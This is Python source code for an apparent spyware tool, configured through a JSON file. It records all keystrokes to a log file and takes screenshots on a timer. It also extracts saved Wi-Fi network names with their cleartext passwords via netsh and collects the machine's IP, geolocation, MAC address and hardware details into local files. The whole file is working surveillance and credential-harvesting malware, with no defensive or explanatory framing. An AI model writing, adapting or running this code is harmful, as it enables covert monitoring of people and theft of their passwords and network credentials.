import time
import os
import sys
import threading
import pyautogui
from datetime import date
import json
from pynput.keyboard import Listener
import urllib.request
from requests import get
import platform
import subprocess
import geocoder
import socket,re,uuid,psutil,logging
system = platform.system()

def log_keystroke(key):
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift':
        key = ''
    if key == "Key.enter":
        key = '\n'

    with open("log.txt", 'a') as f:
        f.write(key)

def take_screenshot(Time):
    while True:
        time.sleep(Time)
        myScreenshot = pyautogui.screenshot()
        today = str(date.today())
        t = time.localtime()
        current_time = time.strftime("%H.%M.%S", t)
        file = str("screenshots\\"+today+"_"+current_time+".png")
        myScreenshot.save(file)
        print("screenshot taken")


def get_wifi_info():
    #gip
    wifi_info_list = []
    external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
    ipv4 = get('https://api.ipify.org').text
    
    wifi_info_list.append('Ipv4: {}'.format(ipv4))
    wifi_info_list.append(f"preferred ip: {external_ip}")

    print('Ipv4: {}'.format(ipv4))
    print("preferred ip:", external_ip)
    #gpa
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    for i in profiles:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        try:
            wifi_info_list.append("{:<30}|  {:<}".format(i, results[0]))
        except IndexError:
            wifi_info_list.append("{:<30}|  {:<}".format(i, ""))

    

    
    
    
    g = geocoder.ip('me')
    cords = str(f"Location cords: {g.latlng}")
    city = str(f"City: {g.city}")
    country = str(f"Country: {g.country}")
    state = str(f"State: {g.state}")
    wifi_info_list.append(cords)
    wifi_info_list.append(country)
    wifi_info_list.append(city)
    wifi_info_list.append(state)
    
    wifi_info_file = open("Wifi_info.txt", "w")
    for info in wifi_info_list:
        wifi_info_file.write(str(info+"\n"))

    wifi_info_file.close()

    
    
def system_info():
    print("getting system info")
    system_info_list = [] 
    operating_system = "operating_system: "+str(platform.platform())
    system_info_list.append(operating_system)
    processor = "processor: "+str(platform.processor())
    ram = "RAM: "+str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
    mac_address = "MAC ADDRESS: "+':'.join(re.findall('..', '%012x' % uuid.getnode()))
    local_ip = "Local ip: "+socket.gethostbyname(socket.gethostname())
    host_name = "host name: "+socket.gethostname()

    system_info_list.append(processor)
    system_info_list.append(ram)
    system_info_list.append(mac_address)
    system_info_list.append(local_ip)
    system_info_list.append(host_name)
    
    system_info_file = open("System Info.txt", "w")
    for info in system_info_list:
        system_info_file.write(str(str(info)+"\n"))


if system == "Linux" or system == "Windows":

    config = open("config.json", "r")
    data = json.load(config)
    keylog = data["key_logg"]
    screenshot = data["take_screenshot"]
    screenshot_time = data["screenshot_time"]
    wifi_info = data["get_wifi_info"]
    get_system_info = data["system_info"]
    print(screenshot)
    if screenshot:
        screenshot_taking = threading.Thread(target=take_screenshot, args=(screenshot_time,))
        screenshot_taking.start()

    if wifi_info:
        wifi_thread = threading.Thread(target=get_wifi_info)
        wifi_thread.start()

    if get_system_info:
        sys_thread = threading.Thread(target=system_info) 
        sys_thread.start()   
    if keylog:
        with Listener(on_press=log_keystroke) as l:
            l.join()


        
else:
    print("Only linux and windows machines are permited!!!")
